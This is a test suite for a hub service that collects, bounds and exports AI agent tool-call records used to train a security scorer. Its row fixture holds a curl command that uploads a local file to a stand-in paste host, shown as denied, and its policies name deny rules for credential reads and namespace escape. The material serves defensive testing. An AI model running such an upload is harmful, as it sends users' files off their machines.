import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import supertest from 'supertest';
import { createHubApp } from '../server';
import { openSqliteDb } from '../db/sqlite';
import { openPgMemDb } from '../db/postgres';
import { createPasswordUser } from '../auth/password';
import { issueApiKey } from '../auth/apiKey';
import { ORG_ID_CHILD_TABLES } from '../routes/orgRename';
import { EventEmitter } from 'events';
import {
  AIRLOCK_DATASET_LIMITS,
  AIRLOCK_DATASET_QUESTIONS,
  pruneAirlockDataset,
  recordAirlockDataset,
  setAirlockDatasetEnabled,
  writeLines,
} from '../services/airlockDataset';
import { writeParentBinding } from '../services/federation/parentBinding';
import { outboxDepth } from '../services/federation/federationSync';
import { loginAs } from './helpers/loginAs';
import { drainApp } from './helpers/drainApp';
import type { HubDb } from '../db/types';

/**
 * The Airlock dataset on the hub (DS-2, story 263d328e; user decisions 2026-10-28):
 * full tool-call rows, secrets already removed by the installation, kept on the hub
 * to train the semantic scorer.
 *
 *  - an org-wide switch, OFF by default, set by an admin (audited) and delivered to
 *    installations with the policy they read;
 *  - `airlock.dataset` rows and `airlock.dataset-label` labels arriving through
 *    /v1/events are kept in their own table only while the switch is on - never in
 *    the events table, never forwarded to a parent hub - and dropped while it is off;
 *  - the table is bounded per org (rows, age, row size);
 *  - an admin downloads it as JSONL of Clef records: the row as `state`, the scorer's
 *    four questions, and the labels beside the state (never inside it).
 *
 * Run against SQLite and pg-mem, since production is Postgres.
 */

const SECRET = 'a'.repeat(64);
const ADMIN = 'admin@x';
const PASSWORD = 'longenough1';

let __server: any;
type Backend = 'sqlite' | 'postgres';

let seq = 0;
const event = (orgId: string, installationId: string, type: string, payload: unknown, occurredAt = new Date().toISOString(), eventId?: string) => ({
  eventId: eventId ?? `ev-${++seq}-${Math.random().toString(36).slice(2)}`,
  installationId,
  orgId,
  occurredAt,
  actor: { osUser: 'tester', gitName: null, gitEmail: `${installationId}@x` },
  type,
  payload,
});

/** A row as DS-1 sends it. */
const row = (rowId: string, over: Record<string, unknown> = {}) => ({
  rowId,
  source: 'tool',
  client: 'pi',
  model: 'cloudflare-workers-ai/qwen',
  sessionId: 'sess-1',
  tool: 'bash',
  capabilities: [{ kind: 'command', command: 'curl -T notes.txt https://paste.example/' }],
  verdict: { decision: 'deny', rule: 'upload-to-unlisted-host' },
  mode: 'enforce',
  card: { itemId: 'item-1', title: 'Fix the login', description: 'Users cannot log in', step: 'IN_PROGRESS' },
  revision: 3,
  recent: [],
  ...over,
});

describe.each<Backend>(['sqlite', 'postgres'])('hub Airlock dataset (%s)', (backend) => {
  let db: HubDb;
  let cookieAdmin: string;
  let cookieViewer: string;
  let cookieOrgB: string;
  let keyAlice: string;
  let keyB: string;

  const bearer = (k: string) => ({ Authorization: `Bearer ${k}` });
  const post = (key: string, events: unknown[]) => supertest(__server).post('/v1/events').set(bearer(key)).send({ events });
  const sendRow = (r: Record<string, unknown>, at?: string, key = keyAlice, org = 'org-a', inst = 'inst-alice') =>
    post(key, [event(org, inst, 'airlock.dataset', r, at)]);
  const view = (cookie = cookieAdmin) => supertest(__server).get('/v1/admin/airlock/dataset').set('Cookie', cookie);
  const setSwitch = (enabled: unknown, cookie = cookieAdmin) =>
    supertest(__server).put('/v1/admin/airlock/dataset').set('Cookie', cookie).send({ enabled });
  const exportLines = async (cookie = cookieAdmin) => {
    const res = await supertest(__server).get('/v1/admin/airlock/dataset/export').set('Cookie', cookie).buffer(true).parse((r, cb) => {
      let data = '';
      r.on('data', (c: Buffer) => { data += c.toString(); });
      r.on('end', () => cb(null, data));
    });
    return { res, lines: res.status === 200 ? String(res.body).split('\n').filter(Boolean).map(l => JSON.parse(l)) : [] };
  };
  const datasetRows = () => db.all<{ event_id: string }>("SELECT event_id FROM airlock_dataset WHERE org_id = 'org-a'");

  beforeEach(async () => {
    db = backend === 'sqlite' ? await openSqliteDb(':memory:') : await openPgMemDb();
    const out = await createHubApp({
      dbPath: ':memory:', secretKey: SECRET, sessionSecret: 'test-session-secret', defaultOrgId: 'org-a', db,
    } as any);
    if (__server) await new Promise<void>(r => __server.close(() => r()));
    __server = out.app.listen(0);
    await db.run("INSERT INTO orgs (id, name) VALUES ('org-b', 'org-b') ON CONFLICT (id) DO NOTHING");
    await createPasswordUser(db, 'org-a', ADMIN, PASSWORD, 'admin');
    await createPasswordUser(db, 'org-a', 'viewer@x', PASSWORD, 'viewer');
    await createPasswordUser(db, 'org-b', 'admin-b@x', PASSWORD, 'admin');
    cookieAdmin = await loginAs(__server, ADMIN, PASSWORD);
    cookieViewer = await loginAs(__server, 'viewer@x', PASSWORD);
    cookieOrgB = await loginAs(__server, 'admin-b@x', PASSWORD);
    keyAlice = await issueApiKey(db, 'org-a', 'alice-laptop', { installationId: 'inst-alice' });
    keyB = await issueApiKey(db, 'org-b', 'other-org', { installationId: 'inst-other' });
  });

  afterEach(async () => {
    await drainApp(__server);
    await db.close();
  });

  describe('the switch', () => {
    it('is off until an admin turns it on, and installations read it with the policy', async () => {
      const v = await view();
      expect(v.status).toBe(200);
      expect(v.body).toMatchObject({ enabled: false, rows: 0, labels: 0 });
      const read = await supertest(__server).get('/v1/airlock/policy').set(bearer(keyAlice));
      expect(read.body.dataset).toEqual({ enabled: false });
    });

    it('an admin turns it on and off; the installation\'s read changes with it (its ETag too)', async () => {
      const before = await supertest(__server).get('/v1/airlock/policy').set(bearer(keyAlice));
      const on = await setSwitch(true);
      expect(on.status, JSON.stringify(on.body)).toBe(200);
      expect(on.body.enabled).toBe(true);
      const after = await supertest(__server).get('/v1/airlock/policy').set(bearer(keyAlice)).set('If-None-Match', before.headers.etag);
      expect(after.status).toBe(200);
      expect(after.body.dataset).toEqual({ enabled: true });
      expect(after.headers.etag).not.toBe(before.headers.etag);
      expect((await setSwitch(false)).body.enabled).toBe(false);
    });

    it('only an admin of the org may read or set it, and each org has its own', async () => {
      expect((await view(cookieViewer)).status).toBe(403);
      expect((await setSwitch(true, cookieViewer)).status).toBe(403);
      expect((await setSwitch('yes')).status).toBe(400);
      await setSwitch(true);
      expect((await view(cookieOrgB)).body.enabled).toBe(false);
    });

    it('a change is audited under its own area', async () => {
      await setSwitch(true);
      const deadline = Date.now() + 3000;
      let found: any;
      for (;;) {
        const rows = (await supertest(__server).get('/v1/admin/audit?area=airlock-dataset').set('Cookie', cookieAdmin)).body.rows ?? [];
        found = rows.find((r: any) => r.action === 'airlock.dataset');
        if (found || Date.now() > deadline) break;
        await new Promise(res => setTimeout(res, 20));
      }
      expect(found).toBeTruthy();
      expect(found.before).toMatchObject({ enabled: false });
      expect(found.after).toMatchObject({ enabled: true });
    });
  });

  describe('ingest', () => {
    it('while the switch is off, a row is accepted but not kept anywhere', async () => {
      const r = await sendRow(row('r-1'));
      expect(r.status, JSON.stringify(r.body)).toBe(200);
      expect(r.body.rejected).toBe(0);
      expect(await datasetRows()).toEqual([]);
      expect(await db.all("SELECT event_id FROM events WHERE type LIKE 'airlock.dataset%'")).toEqual([]);
    });

    it('while it is on, a row is kept in the dataset table only - never with the other events', async () => {
      await setSwitch(true);
      await sendRow(row('r-1'));
      expect(await datasetRows()).toHaveLength(1);
      expect(await db.all("SELECT event_id FROM events WHERE type LIKE 'airlock.dataset%'")).toEqual([]);
      expect((await view()).body).toMatchObject({ enabled: true, rows: 1, labels: 0 });
    });

    it('a row is never forwarded to a parent hub (it stays on the hub its admin switched on)', async () => {
      await writeParentBinding(db, SECRET, { parentUrl: 'https://parent.example.com', token: 'fed_' + 'f'.repeat(64), childHubId: 'ch-1' });
      await setSwitch(true);
      await post(keyAlice, [event('org-a', 'inst-alice', 'airlock.dataset', row('r-1')), event('org-a', 'inst-alice', 'item.closed', {})]);
      expect(await datasetRows()).toHaveLength(1);
      expect(await outboxDepth(db)).toBe(1);
    });

    it('switching it off stops new rows at once', async () => {
      await setSwitch(true);
      await sendRow(row('r-1'));
      await setSwitch(false);
      await sendRow(row('r-2'));
      expect(await datasetRows()).toHaveLength(1);
    });

    it('a row from another org lands in that org only, and the same event twice is one row', async () => {
      await setSwitch(true);
      const e = event('org-a', 'inst-alice', 'airlock.dataset', row('r-1'));
      await post(keyAlice, [e]);
      await post(keyAlice, [e]);
      await post(keyB, [event('org-b', 'inst-other', 'airlock.dataset', row('r-b'))]);
      expect(await datasetRows()).toHaveLength(1);
      expect((await view(cookieOrgB)).body.rows).toBe(0);
    });

    it('a row larger than the bound, or older than it, is not kept', async () => {
      await setSwitch(true);
      await sendRow(row('big', { capabilities: [{ kind: 'path', path: 'a.txt', access: 'write', content: 'x'.repeat(AIRLOCK_DATASET_LIMITS.maxRowBytes) }] }));
      const old = new Date(Date.now() - (AIRLOCK_DATASET_LIMITS.maxAgeDays + 1) * 86_400_000).toISOString();
      await sendRow(row('old'), old);
      await sendRow(row('ok'));
      expect(await datasetRows()).toHaveLength(1);
    });

    it('a row dated ahead of the hub\'s clock is not kept, and does not cost the rest of its batch', async () => {
      await setSwitch(true);
      const ahead = new Date(Date.now() + 7 * 86_400_000).toISOString();
      await post(keyAlice, [event('org-a', 'inst-alice', 'airlock.dataset', row('ahead'), ahead), event('org-a', 'inst-alice', 'airlock.dataset', row('ok'))]);
      const kept = await db.all<{ row_id: string }>("SELECT row_id FROM airlock_dataset WHERE org_id = 'org-a'");
      expect(kept.map(k => k.row_id)).toEqual(['ok']);
    });

    it('a label is kept against its row', async () => {
      await setSwitch(true);
      await sendRow(row('r-1'));
      await post(keyAlice, [event('org-a', 'inst-alice', 'airlock.dataset-label', { rowId: 'r-1', label: { kind: 'approval', decision: 'deny' } })]);
      expect((await view()).body).toMatchObject({ rows: 1, labels: 1 });
    });
  });

  describe('the bound', () => {
    it('keeps the newest rows up to the cap and drops what is past the age', async () => {
      await setSwitch(true);
      const day = 86_400_000;
      const now = Date.now();
      for (const [id, ago] of [['a', 5], ['b', 4], ['c', 3], ['d', 2], ['e', 40]] as const) {
        await sendRow(row(id), new Date(now - ago * day).toISOString());
      }
      const kept = async () => (await db.all<{ row_id: string }>("SELECT row_id FROM airlock_dataset WHERE org_id = 'org-a' ORDER BY row_id")).map(k => k.row_id);
      // the age alone
      await pruneAirlockDataset(db, 'org-a', { maxRows: 100, maxAgeDays: 30, now });
      expect(await kept()).toEqual(['a', 'b', 'c', 'd']);
      // then the cap: the newest stay
      await pruneAirlockDataset(db, 'org-a', { maxRows: 3, maxAgeDays: 30, now });
      expect(await kept()).toEqual(['b', 'c', 'd']);
    });
  });

  describe('export', () => {
    it('is admin only', async () => {
      expect((await exportLines(cookieViewer)).res.status).toBe(403);
    });

    it('gives one Clef record per row: the row as state, the four questions, its labels beside the state', async () => {
      await setSwitch(true);
      await sendRow(row('r-1'));
      await sendRow(row('r-2', { tool: 'write' }));
      await post(keyAlice, [event('org-a', 'inst-alice', 'airlock.dataset-label', { rowId: 'r-1', label: { kind: 'approval', decision: 'grant' } })]);
      const { res, lines } = await exportLines();
      expect(res.status).toBe(200);
      expect(res.headers['content-type']).toMatch(/application\/x-ndjson/);
      expect(res.headers['content-disposition']).toMatch(/attachment; filename="airlock-dataset-.*\.jsonl"/);
      expect(lines).toHaveLength(2);
      const one = lines.find((l: any) => l.id === 'r-1');
      expect(one.state).toMatchObject({ tool: 'bash', card: { title: 'Fix the login' } });
      expect(one.state.labels).toBeUndefined();
      expect(one.labels).toEqual([{ kind: 'approval', decision: 'grant' }]);
      expect(one.questions).toEqual(AIRLOCK_DATASET_QUESTIONS);
      expect(Object.keys(one.questions)).toEqual(['fits_card', 'sends_data_off_machine', 'touches_credentials', 'risk_level']);
      expect(one.meta).toMatchObject({ installationId: 'inst-alice', imported: false });
      expect(lines.find((l: any) => l.id === 'r-2').labels).toEqual([]);
    });

    it('a label is never in the state, even one the row itself carried', async () => {
      await setSwitch(true);
      await sendRow(row('r-1', { labels: [{ kind: 'approval', decision: 'grant' }] }));
      const { lines } = await exportLines();
      expect(lines[0].state.labels).toBeUndefined();
    });

    it('another org\'s rows are not in it', async () => {
      await setSwitch(true);
      await sendRow(row('r-1'));
      expect((await exportLines(cookieOrgB)).lines).toEqual([]);
    });
  });

  describe('review (Codex gpt-6.1-sol 01a18329)', () => {
    it('labels are capped per row, so they are bounded with the rows', async () => {
      await setSwitch(true);
      await sendRow(row('r-1'));
      const labels = Array.from({ length: AIRLOCK_DATASET_LIMITS.maxLabelsPerRow + 5 }, (_, i) =>
        event('org-a', 'inst-alice', 'airlock.dataset-label', { rowId: 'r-1', label: { kind: 'approval', n: i } }));
      await post(keyAlice, labels);
      expect((await view()).body.labels).toBe(AIRLOCK_DATASET_LIMITS.maxLabelsPerRow);
      const { lines } = await exportLines();
      expect(lines[0].labels).toHaveLength(AIRLOCK_DATASET_LIMITS.maxLabelsPerRow);
    });

    it('a label larger than its own cap is not kept (an export page holds a bounded amount of labels)', async () => {
      await setSwitch(true);
      await sendRow(row('r-1'));
      await post(keyAlice, [
        event('org-a', 'inst-alice', 'airlock.dataset-label', { rowId: 'r-1', label: { kind: 'approval', note: 'x'.repeat(AIRLOCK_DATASET_LIMITS.maxLabelBytes) } }),
        event('org-a', 'inst-alice', 'airlock.dataset-label', { rowId: 'r-1', label: { kind: 'approval', decision: 'grant' } }),
      ]);
      expect((await view()).body.labels).toBe(1);
    });

    it('a row arriving after the switch went off, inside a batch already being kept, is not kept', async () => {
      await setSwitch(true);
      // the admin turns it off between the batch's first row and its second
      let inserts = 0;
      const racing = new Proxy(db, {
        get(target: any, prop) {
          if (prop !== 'run') return typeof target[prop] === 'function' ? target[prop].bind(target) : target[prop];
          return async (sql: string, params: unknown[]) => {
            const out = await target.run(sql, params);
            if (/INSERT INTO airlock_dataset \(/.test(sql) && ++inserts === 1) await setAirlockDatasetEnabled(db, 'org-a', false, null);
            return out;
          };
        },
      });
      const at = new Date().toISOString();
      const kept = await recordAirlockDataset(racing, 'org-a', [
        { e: event('org-a', 'inst-alice', 'airlock.dataset', row('first'), at), userKey: 'u' },
        { e: event('org-a', 'inst-alice', 'airlock.dataset', row('second'), at), userKey: 'u' },
      ]);
      expect(kept).toBe(1);
      expect((await db.all<{ row_id: string }>("SELECT row_id FROM airlock_dataset WHERE org_id = 'org-a'")).map(r => r.row_id)).toEqual(['first']);
    });

    it('a row the database throws on costs only itself, and the table is still pruned', async () => {
      await setSwitch(true);
      const day = 86_400_000;
      await sendRow(row('stale'), new Date(Date.now() - (AIRLOCK_DATASET_LIMITS.maxAgeDays - 1) * day).toISOString());
      const throwing = new Proxy(db, {
        get(target: any, prop) {
          if (prop !== 'run') return typeof target[prop] === 'function' ? target[prop].bind(target) : target[prop];
          return async (sql: string, params: unknown[]) => {
            if (/INSERT INTO airlock_dataset \(/.test(sql) && params.includes('boom')) throw new Error('the database refused it');
            return target.run(sql, params);
          };
        },
      });
      const at = new Date().toISOString();
      const kept = await recordAirlockDataset(throwing, 'org-a', [
        { e: event('org-a', 'inst-alice', 'airlock.dataset', row('boom'), at), userKey: 'u' },
        { e: event('org-a', 'inst-alice', 'airlock.dataset', row('after'), at), userKey: 'u' },
      ], Date.now() + 2 * day);
      expect(kept).toBe(1);
      // 'stale' is now past the age: pruned, though a row before it threw
      expect((await db.all<{ row_id: string }>("SELECT row_id FROM airlock_dataset WHERE org_id = 'org-a' ORDER BY row_id")).map(r => r.row_id)).toEqual(['after']);
    });

    it('a row the database cannot store does not cost the rows after it', async () => {
      await setSwitch(true);
      await post(keyAlice, [event('org-a', 'inst-alice', 'airlock.dataset', row('bad\u0000id')), event('org-a', 'inst-alice', 'airlock.dataset', row('ok'))]);
      expect((await db.all<{ row_id: string }>("SELECT row_id FROM airlock_dataset WHERE org_id = 'org-a'")).map(r => r.row_id)).toEqual(['ok']);
    });
  });

  describe('learning accepts (DS-1)', () => {
    it('an admin allowing a proposed host labels the rows that reached it, and only those', async () => {
      await supertest(__server).put('/v1/admin/airlock').set('Cookie', cookieAdmin).send({ policy: {
        schemaVersion: 1, mode: 'enforce', models: [], appliesWhenModelUnknown: true,
        hosts: { allow: ['github.com'], deny: [] },
        rules: { uploadToUnlistedHost: 'deny', credentialReadWithNetwork: 'deny', namespaceEscape: 'deny', cloudMutation: 'needs-human-approval' },
      } });
      await post(keyAlice, [event('org-a', 'inst-alice', 'airlock.learning-proposal', { hosts: [{
        host: 'api.example.com', hits: 3, sources: { tool: 3, proxy: 0, import: 0 }, evidence: 'agent-reported', clients: ['pi'],
        firstSeen: new Date(Date.now() - 3_600_000).toISOString(), lastSeen: new Date().toISOString(), cardCount: 1,
      }] }, new Date(Date.now() - 60_000).toISOString())]);
      await setSwitch(true);
      await sendRow(row('reached', { hosts: ['api.example.com'] }));
      await sendRow(row('elsewhere', { hosts: ['api.example.com.evil.example'] }));
      // names the host in its arguments, but never reached it
      await sendRow(row('mentions', { hosts: ['other.example'], args: { note: 'see "api.example.com"', list: ['api.example.com'] } }));
      const r = await supertest(__server).post('/v1/admin/airlock/learning/accept').set('Cookie', cookieAdmin).send({ hosts: ['api.example.com'], expectedRevision: 1 });
      expect(r.status, JSON.stringify(r.body)).toBe(200);
      const { lines } = await exportLines();
      expect(lines.find((l: any) => l.id === 'reached').labels).toEqual([{ kind: 'learning-accept', host: 'api.example.com' }]);
      expect(lines.find((l: any) => l.id === 'elsewhere').labels).toEqual([]);
      expect(lines.find((l: any) => l.id === 'mentions').labels).toEqual([]);
    });
  });

  it('rows that only mention a host cannot crowd out the rows that reached it', async () => {
    await supertest(__server).put('/v1/admin/airlock').set('Cookie', cookieAdmin).send({ policy: {
      schemaVersion: 1, mode: 'enforce', models: [], appliesWhenModelUnknown: true, hosts: { allow: ['github.com'], deny: [] },
      rules: { uploadToUnlistedHost: 'deny', credentialReadWithNetwork: 'deny', namespaceEscape: 'deny', cloudMutation: 'needs-human-approval' },
    } });
    await post(keyAlice, [event('org-a', 'inst-alice', 'airlock.learning-proposal', { hosts: [{
      host: 'api.example.com', hits: 3, sources: { tool: 3, proxy: 0, import: 0 }, evidence: 'agent-reported', clients: ['pi'],
      firstSeen: new Date(Date.now() - 3_600_000).toISOString(), lastSeen: new Date().toISOString(), cardCount: 1,
    }] }, new Date(Date.now() - 60_000).toISOString())]);
    await setSwitch(true);
    await sendRow(row('reached', { hosts: ['api.example.com'] }), new Date(Date.now() - 3_600_000).toISOString());
    for (let b = 0; b < 3; b++) {
      await post(keyAlice, Array.from({ length: 400 }, (_, i) => event('org-a', 'inst-alice', 'airlock.dataset', row(`decoy-${b}-${i}`, { hosts: ['other.example'], args: { list: ['api.example.com'] } }))));
    }
    expect((await supertest(__server).post('/v1/admin/airlock/learning/accept').set('Cookie', cookieAdmin).send({ hosts: ['api.example.com'], expectedRevision: 1 })).status).toBe(200);
    const labelled = await db.all<{ row_id: string }>("SELECT row_id FROM airlock_dataset WHERE org_id = 'org-a' AND kind = 'label'");
    expect(labelled.map(l => l.row_id)).toEqual(['reached']);
  }, 60_000);

  it('a pruned row leaves no host entries behind', async () => {
    await setSwitch(true);
    await sendRow(row('gone', { hosts: ['api.example.com'] }), new Date(Date.now() - 10 * 86_400_000).toISOString());
    await sendRow(row('stays', { hosts: ['api.example.com'] }));
    await pruneAirlockDataset(db, 'org-a', { maxAgeDays: 5 });
    const hosts = await db.all<{ row_id: string }>("SELECT row_id FROM airlock_dataset_hosts WHERE org_id = 'org-a'");
    expect(hosts.map(h => h.row_id)).toEqual(['stays']);
  });

  it('an org rename carries the dataset and its switch along', () => {
    expect(ORG_ID_CHILD_TABLES).toEqual(expect.arrayContaining(['airlock_dataset', 'airlock_dataset_hosts', 'airlock_dataset_settings']));
  });
});

describe('writeLines: the export stream', () => {
  it('waits for the reader, and stops - closing the source - when the reader goes away', async () => {
    const res = Object.assign(new EventEmitter(), { destroyed: false, written: [] as string[], write(chunk: string) { this.written.push(chunk); return false; } });
    let closed = false;
    async function* source() {
      try {
        for (let i = 0; ; i++) yield { i };
      } finally {
        closed = true;
      }
    }
    const done = writeLines(res as any, source());
    await new Promise(r => setTimeout(r, 5));
    expect(res.written).toHaveLength(1);
    res.emit('drain');
    await new Promise(r => setTimeout(r, 5));
    expect(res.written).toHaveLength(2);
    // the reader goes: 'close', whatever the destroyed flag says by then
    res.emit('close');
    await done;
    expect(closed).toBe(true);
    expect(res.written).toHaveLength(2);
    expect(res.listenerCount('drain') + res.listenerCount('close')).toBe(0);
  });
});
